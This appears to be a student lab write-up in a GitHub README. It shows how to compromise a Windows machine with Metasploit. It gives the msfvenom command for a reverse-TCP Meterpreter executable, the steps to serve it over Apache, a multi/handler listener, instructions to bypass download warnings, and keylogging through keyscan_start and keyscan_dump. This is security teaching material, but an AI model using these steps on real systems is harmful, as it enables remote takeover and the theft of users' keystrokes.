# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT:

<img width="1591" height="989" alt="image" src="https://github.com/user-attachments/assets/1b3ea063-970a-4906-abd5-d96ae4081551" />





Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:



<img width="2169" height="725" alt="image" src="https://github.com/user-attachments/assets/6ea739fd-d49d-45a5-8816-ad74df6ef672" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="2169" height="725" alt="image" src="https://github.com/user-attachments/assets/0394bb50-55e3-42d0-934d-9f0041959198" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="500" height="200" alt="image" src="https://github.com/user-attachments/assets/234243e9-457f-43a3-9e20-fd83ff88edfd" />

Check the status of apache2
## OUTPUT:

<img width="1023" height="450" alt="image" src="https://github.com/user-attachments/assets/1a977c75-4b86-4089-a9fc-fd9700892095" />



Invoke msfconsole:
## OUTPUT:

<img width="1022" height="632" alt="image" src="https://github.com/user-attachments/assets/bf960829-9abd-44c6-9eee-06e323d104b2" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="962" height="947" alt="image" src="https://github.com/user-attachments/assets/cf6b9023-7533-4070-8dee-c826281bbbe1" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="697" height="147" alt="image" src="https://github.com/user-attachments/assets/c6ed5121-b9e8-4e15-8f18-4fbb53bf44ea" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="820" height="807" alt="image" src="https://github.com/user-attachments/assets/c6f17df9-afa4-4650-96f6-9114a13dc1d4" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="947" height="925" alt="image" src="https://github.com/user-attachments/assets/ea599516-a80a-4ae2-a672-f945ddb54523" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="431" height="105" alt="image" src="https://github.com/user-attachments/assets/7fd56113-f57f-4290-a6bb-5055f10a0c8f" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="450" height="147" alt="image" src="https://github.com/user-attachments/assets/c7093956-cc85-4687-8e5d-b4af132f6c5d" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="715" height="711" alt="image" src="https://github.com/user-attachments/assets/e539121f-951a-434b-a630-3a774bc58015" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="427" height="45" alt="image" src="https://github.com/user-attachments/assets/c4b79d9e-b90e-4a36-bfe1-5fb880d5ea88" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="533" height="123" alt="image" src="https://github.com/user-attachments/assets/8e92af43-6d36-4437-9946-b1f6e64d152f" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
